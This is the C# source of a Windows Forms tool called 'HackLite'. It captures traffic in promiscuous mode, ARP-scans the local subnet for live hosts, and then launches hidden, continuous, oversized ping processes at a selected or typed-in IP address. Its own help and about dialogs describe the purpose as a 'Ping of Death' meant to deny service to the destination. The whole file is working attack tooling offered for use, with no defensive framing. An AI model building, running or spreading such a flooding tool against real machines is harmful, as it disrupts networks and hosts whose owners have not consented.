using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PacketDotNet;
using SharpPcap;
using System.Collections.Concurrent;
using SharpPcap.WinPcap;
using System.Text.RegularExpressions;
using SharpPcap.LibPcap;
using System.Net.NetworkInformation;
using System.Threading;
using System.Net;
using System.Diagnostics;

namespace HackLite
{
    public partial class FrmHome : Form
    {
        CaptureDeviceList devices;
        public static ICaptureDevice device;
        //public static string rawPacketData = "";
        //ip, mac, time it will expire
        //public static List<Tuple<string, string, DateTime>> ipList = new List<Tuple<string, string, DateTime>>();
        //public static List<string> possibleAddresses = new List<string>();
        private static ScanTable ipLists;
        private static Settings settings = new Settings();
        public static int UDP = 0;
        public static int TCP = 0;
        //the address of the local box
        public static string localIp;
        private static string lastPacket = "";
        //the mac of the local box
        public static PhysicalAddress localMAC;
        private PcapAddress Address;
        String Saved_Address;
        String targetAddress;

        public FrmHome()
        {
            InitializeComponent();
            devices = CaptureDeviceList.Instance;
            if (devices == null || devices.Count < 1)
            {
                MessageBox.Show("Error, no Capture Devices Found");
                Application.Exit();
            }
            foreach (ICaptureDevice dev in devices)
            {
                comboBox1.Items.Add(dev.Description);
            }
        }
        public static string ConvertIpToHex(string ip)
        {
            string[] parts = ip.Split('.');
            int[] intParts = new int[4];
            string[] macAddress = new string[4];
            if (parts.Length == 4)
            {
                bool valid = true;
                for (int i = 0; i < parts.Length; i++)
                {
                    valid = valid && Int32.TryParse(parts[i], out intParts[i]);
                    if (valid)
                    {
                        valid = (intParts[i] <= 255 && intParts[i] >= 0);
                    }
                    if (valid)
                    {
                        macAddress[i] = intParts[i].ToString("X");
                        if (macAddress[i].Length < 2)
                        {
                            macAddress[i] = "0" + macAddress[i];
                        }
                    }
                    else
                    {
                        continue;
                    }
                }
                if (valid)
                {
                    return macAddress[0] + macAddress[1] + macAddress[2] + macAddress[3];
                }
                return "ERROR";
            }
            return "ERROR";
        }
        public static string ConvertHexIpToStandard(string ip)
        {
            if (ip.Length < 8)
            {
                throw new Exception("Invalid IP to convert to Hex");
            }
            return Convert.ToInt32(ip.Substring(0, 2), 16) + "." + Convert.ToInt32(ip.Substring(2, 2), 16) + "." + Convert.ToInt32(ip.Substring(4, 2), 16) + "." + Convert.ToInt32(ip.Substring(6, 2), 16);
        }
        private static void device_OnPacketArrival(object sender, CaptureEventArgs args)
        {

            byte[] data = args.Packet.Data;
            int byteCounter = 0;
            var rawPacketData = "";
            foreach (byte b in data)
            {
                byteCounter++;
                //add byte to sting in hex
                rawPacketData += b.ToString("X2");
            }
            if (rawPacketData == lastPacket)
                return;
            lastPacket = rawPacketData;
     
            string type = "";
            string sourceIp = "";
            string destinationIp = "";
            //get ethernet type
            for (int i = 12; i <= 13; i++)
                type += rawPacketData[i * 2] + "" + rawPacketData[i * 2 + 1];


            if (type == "0806") //an arp packet
            {
                var arpOp = rawPacketData[20 * 2] + "" + rawPacketData[20 * 2 + 1] + " " + rawPacketData[21 * 2] + "" + rawPacketData[21 * 2 + 1];
                for (int i = 28; i <= 31; i++)
                {
                    sourceIp += Convert.ToInt32((rawPacketData[i * 2] + "" + rawPacketData[i * 2 + 1]), 16);
                    if (i != 31)
                        sourceIp += ".";
                }
                for (int i = 38; i <= 41; i++)
                {
                    destinationIp += Convert.ToInt32((rawPacketData[i * 2] + "" + rawPacketData[i * 2 + 1]), 16);
                    if (i != 41)
                        destinationIp += ".";
                }
                if (destinationIp == localIp)
                {
                    //if we get an arp back from an ip we thought was avalible...
                    if (ipLists != null && ipLists.isAvailable(sourceIp))
                    {
                        //mac source
                        string sourceMac = "";
                        for (int i = 6; i < 12; i++)
                            sourceMac += rawPacketData[i * 2] + "" + rawPacketData[i * 2 + 1];
                        //the mac, and the time it will expire We dont know, so just put the max
                        ipLists.reserveIp(sourceIp, sourceMac, DateTime.MaxValue);
                    }
                    Console.WriteLine(sourceIp + " Replied");
                }
            }
     
            rawPacketData = "";
        }
        private void updateTable()
        {
            if (ipLists != null && ipLists.isUpdated())
            {
                int temp1 = dataGridView1.FirstDisplayedScrollingRowIndex;
                var ips = ipLists.GetIPsInUse();
                dataGridView1.Rows.Clear();
                foreach (var ip in ips)
                {
                    //just add in the ip address for now, may latter add in the mac and date expiring
                    dataGridView1.Rows.Add(ip.Item1, ip.Item2, ip.Item3);
                }
                if (dataGridView1.RowCount < temp1)
                    temp1 = dataGridView1.RowCount - 1;
                dataGridView1.FirstDisplayedScrollingRowIndex = temp1;
            }
        }
        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                if (btnStart.Text == "Red Pill")
                {
                    try
                    {
                        regDevice();
                        int readTimeoutMilliseconds = 1000;
                        device.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
                        //pull address info from the nic
                        Address = ((WinPcapDevice)device).Addresses.FirstOrDefault(x => x.Addr.ipAddress != null && (x.Addr.ipAddress + "").Length <= 15);
                        localMAC = ((WinPcapDevice)device).Addresses.FirstOrDefault(x => x.Addr.hardwareAddress != null).Addr.hardwareAddress;
                        localIp = Address.Addr.ipAddress.ToString();
                        var name = device.Description;
                        device.StartCapture();
                        comboBox1.Enabled = false;
                        MessageBox.Show("NIC has been Selected");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
                else
                {
                    try
                    {

                        try
                        {
                            device.StopCapture();
                        }
                        catch (PcapException pex)
                        {
                            Console.WriteLine(pex.Message);
                        }
                        device.Close();
                        dataGridView1.Visible = false;
                        comboBox1.Enabled = true;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private void regDevice()
        {
            device = devices.Where(x => x.Description == comboBox1.SelectedItem.ToString()).FirstOrDefault();
            device.OnPacketArrival += new SharpPcap.PacketArrivalEventHandler(device_OnPacketArrival);
        }


        private void SelectedIndexChange(object sender, EventArgs e)
        {
            regDevice();
            clearScreen();
        }

        private void clearScreen()
        {
            if (ipLists != null)
                ipLists.Reset();
        }








   

        Task<string> ARPAsync(string address)
        {
            var tcs = new TaskCompletionSource<string>();
            ARP(IPAddress.Parse(address));
            tcs.SetResult(address);
            return tcs.Task;
        }

        public void ARP(IPAddress ipAddress)
        {
            if (ipAddress == null)
                throw new Exception("ARP IP address Cannot be null");
            var ethernetPacket = new PacketDotNet.EthernetPacket(localMAC, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), PacketDotNet.EthernetPacketType.Arp);

            var arpPacket = new PacketDotNet.ARPPacket(PacketDotNet.ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), ipAddress, localMAC, Address.Addr.ipAddress);
            ethernetPacket.PayloadPacket = arpPacket;

            device.SendPacket(ethernetPacket);
        }

        Task<PingReply> Ping(string address)
        {
            Random random = new Random();
            int counter = random.Next(5000, 65000);
            var tcs = new TaskCompletionSource<PingReply>();
            Ping ping = new Ping();
            string data = "a";
           
            for (int i = 0; i<counter; i++)
            {
                data += "a";
            }
            byte[] buffer = Encoding.ASCII.GetBytes(data);
            System.Diagnostics.Process cmdping = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "ping";
            //cmdping.StartInfo.UseShellExecute = false;
            startInfo.Arguments = (" " + address + " -t -l " + counter);
            cmdping.StartInfo = startInfo;
            cmdping.Start();
            int timeout = 10000;
            PingReply reply = ping.Send(address, timeout, buffer);
            ping.PingCompleted += (obj, sender) =>
            {
                if (reply.Status == IPStatus.Success) {
                    if (tabControl1.SelectedTab == tabPage2)
                    {
                        dataGridView2.Rows.Add(sender.Reply.Address, counter);
                    }
                    else
                    {
                        dataGridView3.Rows.Add(sender.Reply.Address, counter);
                    }

                    tcs.SetResult(sender.Reply);
                }
                else
                {
                    if (tabControl1.SelectedTab == tabPage2)
                    {
                        dataGridView2.Rows.Add(Saved_Address, "Request timed out");
                    }
                    else
                    {
                        dataGridView3.Rows.Add(targetAddress, "Request timed out");
                    }
                }
                    
            };
            ping.SendAsync(address, new object());
            return tcs.Task;
        }

     

        private void BtnScan_Click_1(object sender, EventArgs e)
        {
            try
            {
                //possibleAddresses = IPTables.gennerateIPRange(localIp, localMAC.ToString());
                ipLists = new ScanTable(localIp, settings.subnet);
                var list = ipLists.GetAvalible();
                List<Task<string>> arpTasks = new List<Task<string>>();
                foreach (var address in list)
                {
                    arpTasks.Add(ARPAsync(address));
                }
                Saved_Address = dataGridView1.Rows[0].Cells[0].Value.ToString();
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("NIC must be selected first");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            updateTable();
            
        }

        private void tabView_Selecting(object sender, TabControlCancelEventArgs e)
        {
            if (device == null || !device.Started)
            {
                e.Cancel = true;
                MessageBox.Show("Select NIC First and Start");
            }
        }


        private void BtnPoison_Click(object sender, EventArgs e)
        {
         for (int i = 0; i < 2; i++)
            {
      
                Ping(Saved_Address);
            }
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            try {
                int rowIndex = e.RowIndex;
                DataGridViewRow row = dataGridView1.Rows[rowIndex];

                Saved_Address = dataGridView1.Rows[rowIndex].Cells[0].Value.ToString();

            }
            catch
            {
                MessageBox.Show("Mac Addresses not selectable");
            }
        }


        public static void kill_ping()
        {
            System.Diagnostics.Process killPing = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo killInfo = new System.Diagnostics.ProcessStartInfo();
            killInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            killInfo.FileName = "Taskkill";
            //cmdping.StartInfo.UseShellExecute = false;
            killInfo.Arguments = ("/IM PING.EXE /F");
            killPing.StartInfo = killInfo;
            killPing.Start();
            MessageBox.Show("Ping.Exe Killed");
        }

        private void btnKillPing_Click(object sender, EventArgs e)
        {
            kill_ping();
        }

     

        private void guideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("First Select a NIC and press the Red pill, the blue pill will exit, then Select Ping of Death scan the network for an ip address to select then click begin DOS, when Exiting Dont forget to Kill processes");
        }

        private void aboutUsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This Program allows you to continous Ping the Desinated IP Address in an attempt to denial of service the destination");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                for (int i = 0; i < 20; i++)
                {

                    targetAddress = txtEnterIP.Text;
                    Ping(targetAddress);
                }
            }
            catch
            {

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            kill_ping();
        }
    }
}